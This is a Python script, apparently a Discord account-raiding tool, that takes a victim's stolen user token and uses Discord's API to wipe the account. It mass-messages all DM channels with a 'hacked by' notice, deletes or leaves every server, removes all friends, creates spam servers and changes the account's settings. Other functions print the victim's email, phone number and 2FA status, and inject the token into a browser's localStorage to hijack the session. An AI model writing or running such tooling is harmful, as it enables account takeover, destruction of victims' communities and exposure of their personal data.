


# Modules

import threading
import requests
import discord
import random
import os
import re
from time import sleep
from itertools import cycle
from datetime import datetime
from selenium import webdriver
from bs4 import BeautifulSoup
import requests
from colorama import Fore, Style, init
init(convert=True)
guildsIds = []
friendIds = []
channelIds = []
threads = 0


def clear():
    os.system('cls')
    return


def search_for_updates():
    THIS_VERSION = "1.5.3"

    header = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest"}
    url = f"https://github.com/Catterall/discord-raidkit/releases/latest"

    os.system('cls')
    print("Searching for updates.")
    r = requests.get(url, headers=header)
    os.system('cls')
    soup = str(BeautifulSoup(r.text, 'html.parser'))
    s1 = re.search('<title>', soup)
    s2 = re.search('·', soup)
    result_string = soup[s1.end():s2.start()]
    if THIS_VERSION not in result_string:
        s3 = re.search('originating_url":"', soup)
        s4 = re.search('","user_id":null', soup)
        update_link = soup[s3.end():s4.start()]
       


class Login(discord.Client):
    async def on_connect(self):
        for guild in self.guilds:
            guildsIds.append(guild.id)

        for friend in self.user.friends:
            friendIds.append(friend.id)

        for channel in self.private_channels:
            channelIds.append(channel.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except BaseException:
            print(Fore.RED + "\nInvalid Token.")
            sleep(3)
            main()


# Log into an account via a token.

def login(token):
    webdriver.ChromeOptions.binary_location = r"browser\chrome.exe"
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=
    opts)
    script = """
            function login(token) {
setInterval(() => {
document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
}, 50);
setTimeout(() => {
location.reload();
}, 2500);
}

           
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'login("{token}")')
    main()


# Gather an account's information via a token.

def spy(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        


        print(f'''
        {Fore.RESET}[{Fore.LIGHTRED_EX}User ID{Fore.RESET}]        {userID}
        [{Fore.LIGHTRED_EX}User Name{Fore.RESET}]     {userName}
        [{Fore.LIGHTRED_EX}2 Factor{Fore.RESET}]       {mfa}
        [{Fore.LIGHTRED_EX}Email{Fore.RESET}]          {email}
        [{Fore.LIGHTRED_EX}Phone number{Fore.RESET}]   {phone if phone else ""}
        [{Fore.LIGHTRED_EX}Token{Fore.RESET}]          {token}
        
            ''')
        choice = str(input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}x{Fore.LIGHTRED_EX}] {Fore.RESET}Press anything to continue . . .  {Fore.LIGHTRED_EX}'))
        main()
    else:
        print(f'\n{Fore.RED}Invalid Token.')
        sleep(3)
        main()


# Nuke an account via a token.

def accountNuke(token):
    headers = {'Authorization': token}
    print(
        f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.LIGHTRED_EX}Nuking account. . .")
    print()
    for id in channelIds:
        try:
            requests.post(f'https://discord.com/api/v8/channels/{id}/messages', 
            headers=headers, 
            data={"content": "hacked by Water, follow me on instagram: @water.cs"})
            print(f"{Fore.RED}Messaged ID: {Fore.WHITE}{id}.{Fore.RESET}")
        except Exception as e:
            print(f"The following exception has been encountered and is being ignored: {e}")
    print(f"{Fore.RED}Messaged all available IDs.{Fore.RESET}\n")

    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
            print(f'{Fore.LIGHTRED_EX}Deleted guild: {Fore.WHITE}{guild}.{Fore.RESET}')
        except Exception as e:
            print(f"The following exception has been encountered and is being ignored: {e}")

    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v6/users/@me/guilds/{guild}',
                headers=headers)
            print(f"{Fore.LIGHTRED_EX}Left guild: {Fore.WHITE}{guild}.{Fore.RESET}")
        except Exception as e:
            print(f"The following exception has been encountered and is being ignored: {e}")
    print(f"{Fore.YELLOW}Deleted/Left all available guilds.{Fore.RESET}\n")
    
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v6/users/@me/relationships/{friend}',
                headers=headers)
            print(f"{Fore.GREEN}Deleted friend: {Fore.WHITE}{friend}.{Fore.RESET}")
        except Exception as e:
            print(f"The following exception has been encountered and is being ignored: {e}")
    print(f"{Fore.GREEN}Deleted all available friends.{Fore.RESET}\n")
    
    for i in range(10):
        try:
            payload = {'name': 'Jacked by Water', 'region': '', 'icon': None, 'channels': None}
            requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
            print(f"{Fore.BLUE}Created advert server #{i}.{Fore.RESET}")
        except Exception as e:
            print(f"The following exception has been encountered and is being ignored: {e}")
    print(f"{Fore.BLUE}Created all advert servers.{Fore.RESET}\n")

    setting = {"theme": "light", "locale": "ja"}
    requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
    print(f"{Fore.MAGENTA}Changed account language to japanese and account theme to light mode.\n\n")
    print(f"{Fore.LIGHTGREEN_EX}Account nuked successfully! Enter anything to continue. . . ", end="")
    input()
    main()


def main():
    global threads
    threads = 0
    clear()
    banner = Style.BRIGHT + f'''

╔═══════════════════════════════════════════════════╗
║   ███╗   ██╗██╗   ██╗██╗  ██╗███████╗    ██╗  ██╗ ║ 
║   ████╗  ██║██║   ██║██║ ██╔╝██╔════╝    ╚██╗██╔╝ ║ 
║   ██╔██╗ ██║██║   ██║█████╔╝ █████╗       ╚███╔╝  ║ 
║   ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝       ██╔██╗  ║ 
║   ██║ ╚████║╚██████╔╝██║  ██╗███████╗    ██╔╝ ██╗ ║ 
║   ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ║ 
╚═══════════════════════════════════════════════════╝  '''.replace('█', f'{Fore.LIGHTRED_EX}█{Fore.WHITE}') + f'''
                                                           



{Fore.LIGHTRED_EX}[{Fore.WHITE}1{Fore.LIGHTRED_EX}] {Fore.WHITE}Account Nuker
{Fore.LIGHTRED_EX}[{Fore.WHITE}2{Fore.LIGHTRED_EX}] {Fore.WHITE}Token lookup
{Fore.LIGHTRED_EX}[{Fore.WHITE}3{Fore.LIGHTRED_EX}] {Fore.WHITE}Tokenlogin(Patched)
{Fore.LIGHTRED_EX}[{Fore.WHITE}4{Fore.LIGHTRED_EX}] {Fore.WHITE}Exit{Style.RESET_ALL}

'''
    print(banner)
    choice = str(input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}x{Fore.LIGHTRED_EX}] {Fore.RESET}Choice: {Fore.LIGHTRED_EX}'))
    if choice == '1':
        token = str(input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}x{Fore.LIGHTRED_EX}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'}
        r = requests.get(
            'https://discord.com/api/v6/users/@me',
            headers=headers)
        if r.status_code == 200:
            clear()
            threads = 100
            Login().run(token)
            if threading.active_count() < threads:
                t = threading.Thread(target=accountNuke, args=(token, ))
                t.start()
                return
        else:
            print(Fore.RED + "\nInvalid Token.")
            sleep(3)
            main()
        
    elif choice == '2':
        token = str(input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}x{Fore.LIGHTRED_EX}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        spy(token)

    elif choice == '3':
        token = str(input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}x{Fore.LIGHTRED_EX}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'}
        r = requests.get(
            'https://discord.com/api/v6/users/@me',
            headers=headers)
        if r.status_code == 200:
            login(token)
        else:
            print(Fore.LIGHTRED_EX + "\nInvalid Token.")
            sleep(3)
            main()

    elif choice == '4':
        choice = str(input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}x{Fore.LIGHTRED_EX}] {Fore.RESET}Do you want to exit? (y / n): {Fore.LIGHTRED_EX}'))
        if choice.upper() == 'Y':
            clear()
            Style.RESET_ALL
            Fore.RESET
            os._exit(0)
        else:
            main()
    else:
        clear()
        main()


if __name__ == "__main__":
    search_for_updates()
    main()


